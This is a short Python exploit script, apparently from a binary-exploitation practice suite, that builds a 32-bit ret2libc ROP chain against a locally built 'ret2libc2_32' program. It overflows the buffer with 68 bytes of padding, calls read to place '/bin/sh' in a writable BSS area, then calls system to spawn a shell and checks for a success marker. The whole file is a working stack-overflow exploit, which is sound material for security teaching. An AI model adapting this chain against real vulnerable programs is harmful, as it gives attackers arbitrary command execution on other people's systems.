from common import BUILD, execute, p32, plt, print_result, symbols

binary = BUILD / "ret2libc2_32"
sym = symbols(binary)
read_plt = plt(binary, "read")
system_plt = plt(binary, "system")
chain = b"".join(
    [
        p32(read_plt), p32(sym["gadget_pop3_ret"]),
        p32(0), p32(sym["writable_area"]), p32(8),
        p32(system_plt), p32(plt(binary, "exit")), p32(sym["writable_area"]), p32(0),
    ]
)
payload = b"A" * 68 + chain
print(
    f"[ret2libc2] offset=68, read@plt=0x{read_plt:08x}, "
    f"writable BSS=0x{sym['writable_area']:08x}, system@plt=0x{system_plt:08x}"
)
status, output = execute(
    binary, [payload, b"/bin/sh\x00"], b"echo RET2LIBC2_OK\nexit\n", delay=0.15
)
print_result("ret2libc2", status, output, "RET2LIBC2_OK")
